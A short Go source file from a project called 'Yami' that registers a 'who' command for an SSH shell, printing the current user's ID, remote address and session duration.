package commands

import (
	Sessions "Yami/core/clients/session"
	"fmt"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

// branding reload command
func init() {
	Register(&Command{
		Name: "who",
		Admin: false,
		Reseller: false,

		Descriptions: "Standard Linux Who Command!!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session,cmd []string) error {

			channel.Write([]byte(string(" "+strconv.Itoa(Session.User.ID)+" (\x1b[38;5;11m"+sshConn.RemoteAddr().String()+"\x1b[0m) "+fmt.Sprintf("%.2f minutes\r\n", time.Since(Session.OpenAt).Minutes()))))


			return nil
		},
	})
}